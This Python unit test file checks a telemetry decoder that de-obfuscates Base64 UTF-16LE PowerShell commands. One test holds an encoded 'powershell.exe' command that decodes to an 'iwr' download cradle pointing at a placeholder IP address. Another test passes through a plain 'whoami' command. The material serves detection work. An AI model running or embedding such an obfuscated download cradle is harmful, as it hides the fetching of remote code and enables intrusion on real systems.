"""Unit tests for the telemetry normalizer and de-obfuscation decoder.

Validates deterministic extraction of Base64 UTF-16LE PowerShell payloads
and verify passthrough behavior for unencoded commands.
"""

from src.normalizer.decoder import decode_powershell_base64


def test_powershell_utf16le_sample_decoding() -> None:
    """Test de-obfuscation of a Base64-encoded PowerShell web-request cradle.

    Verifies that PowerShell flags like '-nope' (NoProfile + EncodedCommand)
    are recognized, the Base64 payload is correctly parsed and decoded as
    UTF-16LE, and the obfuscation type is labeled appropriately.
    """
    cmd = "powershell.exe -nope aQB3AHIAIAAxADkAOAAuADUAMQAuADEAMAAwAC4ANAAyAC8AdQA="

    decoded, obf_type = decode_powershell_base64(cmd)

    assert "iwr 198.51.100.42/u" in decoded
    assert obf_type == "Base64 (UTF-16LE)"


def test_unencoded_command_passthrough() -> None:
    """Test that commands without Base64 encoding pass through unchanged.

    Ensures that plain administrative commands (e.g. cmd.exe /c whoami)
    are returned unaltered with an obfuscation classification of 'None'.
    """
    cmd = "cmd.exe /c whoami"
    decoded, obf_type = decode_powershell_base64(cmd)
    assert decoded == cmd
    assert obf_type == "None"
